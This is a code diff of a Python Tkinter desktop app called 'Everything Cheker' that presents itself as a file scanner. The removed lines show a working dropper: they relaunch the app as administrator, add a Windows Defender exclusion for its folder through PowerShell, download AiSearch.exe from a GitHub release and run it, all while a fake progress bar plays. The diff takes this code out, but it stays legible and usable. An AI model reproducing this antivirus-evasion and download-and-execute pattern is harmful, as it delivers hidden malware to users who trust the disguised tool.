@@ -7,21 +7,9 @@ import requests
 import os
 import tempfile
 import hashlib
-import subprocess
-import sys
-import ctypes
-
-
-
-
-from pefile import set_bitfields_format
-
-DOWNLOAD_URL = "https://github.com/SSDDAA-AFK/Everything_cheker/releases/download/v1.0/AiSearch.exe"
 
 FOLDER = os.path.join(os.path.expanduser("~"), "Documents", "Checker")
 os.makedirs(FOLDER, exist_ok=True)
-
-FILENAME = os.path.join(FOLDER, "AiSearch.exe")
 THEME_FILE = os.path.join(FOLDER, "theme.txt")
 
 ICON_URL = "https://raw.githubusercontent.com/SSDDAA-AFK/Everything_cheker/main/icon.ico"
@@ -32,7 +20,6 @@ SCAN_LIST_PATH = os.path.join(FOLDER, "scanlist.txt")
 
 FOUND_FILES = []
 SUSPICIOUS_FILES = []
-AI_SUSPECTS = []
 
 BG = "#2B1A12"
 CARD = "#3A2318"
@@ -119,13 +106,9 @@ class LoaderApp:
         self.total_files = 0
         self.scanned_files = 0
 
-        if not self.is_admin():
-
-            self.restart_as_admin()
-
         self.root = root
         self.root.protocol("WM_DELETE_WINDOW", self.on_close)
-        self.root.title("Everything Cheker V1.0")
+        self.root.title("Everything Cheker V1.1")
         self.root.geometry("460x280")
         if self.download_icon():
             self.root.iconbitmap(ICON_PATH)
@@ -224,27 +207,6 @@ class LoaderApp:
             pass
 
         os._exit(0)
-
-    def is_admin(self):
-        try:
-            return ctypes.windll.shell32.IsUserAnAdmin()
-        except:
-            return False
-
-    def restart_as_admin(self):
-
-        params = " ".join([f'"{arg}"' for arg in sys.argv])
-
-        ctypes.windll.shell32.ShellExecuteW(
-            None,
-            "runas",  # ← Запуск як адмін
-            sys.executable,
-            params,
-            None,
-            1
-        )
-
-        sys.exit(0)
 
     def download_icon(self):
 
@@ -428,52 +390,6 @@ class LoaderApp:
         global AI_SUSPECTS
         AI_SUSPECTS = suspects
 
-    # def analyze_behavior(self):
-    #
-    #     suspects = []
-    #
-    #     self.scanned_files = 0
-    #
-    #     for root_dir, dirs, files in os.walk(os.path.expanduser("~")):
-    #
-    #         for file in files:
-    #
-    #             self.scanned_files += 1
-    #
-    #             percent = int(
-    #                 (self.scanned_files / self.total_files) * 100
-    #             )
-    #
-    #             self.root.after(0, lambda p=percent: (
-    #                 self.progress.config(value=p),
-    #                 self.status.config(text=f"Analyzing: {p}%")
-    #             ))
-    #
-    #             if not file.lower().endswith(".exe"):
-    #                 continue
-    #
-    #             path = os.path.join(root_dir, file)
-    #
-    #             try:
-    #                 size = os.path.getsize(path) / 1024 / 1024
-    #
-    #                 score = 0
-    #
-    #                 if size < 5:
-    #                     score += 1
-    #
-    #                 if "program files" not in path.lower():
-    #                     score += 1
-    #
-    #                 if score >= 2:
-    #                     suspects.append(path)
-    #
-    #             except:
-    #                 pass
-    #
-    #     global SUSPICIOUS_FILES
-    #     SUSPICIOUS_FILES = suspects
-
     def show_full_results(self):
 
         theme = THEMES[self.current_theme]
@@ -490,7 +406,7 @@ class LoaderApp:
 
         win = tk.Toplevel(self.root)
         win.title("🛡 Scan Results")
-        win.geometry("650x420")
+        win.geometry("650x312")
         if self.download_icon():
             win.iconbitmap(ICON_PATH)
         win.configure(bg=bg)
@@ -576,45 +492,13 @@ class LoaderApp:
         # ПРИМЕНЯЕМ
         self.apply_theme(animated=True)
 
-    def add_defender_exclusion(self):
-
-        try:
-            folder = FOLDER
-
-            command = f'Add-MpPreference -ExclusionPath "{folder}"'
-
-            subprocess.run([
-                "powershell",
-                "-Command",
-                command
-            ], shell=True)
-
-            print("Defender exclusion added")
-
-        except Exception as e:
-            print("Defender error:", e)
-
     def stage1(self):
-
-        self.add_defender_exclusion()
-        # Скачиваем список
         self.download_scan_list()
-
-        # Скачиваем EXE
-        threading.Thread(target=self.download, daemon=True).start()
 
         self.run_bar(8, 15, "Downloading")
 
-        while not self.downloaded:
-            time.sleep(0.2)
-
-        try:
-            os.startfile(os.path.abspath(FILENAME))
-
-            self.stage2()
-
-        except:
-            self.label.config(text="❌ ERROR for startup")
+        time.sleep(0.2)
+        self.stage2()
 
     def stage2(self):
 
@@ -651,7 +535,6 @@ class LoaderApp:
 
             self.status.config(text=f"{text}: {i}%")
 
-            # Обновляем цвет через главный поток
             self.root.after(0, self.update_label_color)
 
     def save_theme(self):
@@ -762,23 +645,6 @@ class LoaderApp:
             fg=theme["TEXT"],
             bg=theme["CARD"]
         )
-
-    def download(self):
-
-        try:
-
-            r = requests.get(DOWNLOAD_URL, stream=True)
-
-            with open(FILENAME, "wb") as f:
-
-                for chunk in r.iter_content(1024):
-                    if chunk:
-                        f.write(chunk)
-
-            self.downloaded = True
-
-        except:
-            self.downloaded = False
 
     def finish(self):
 
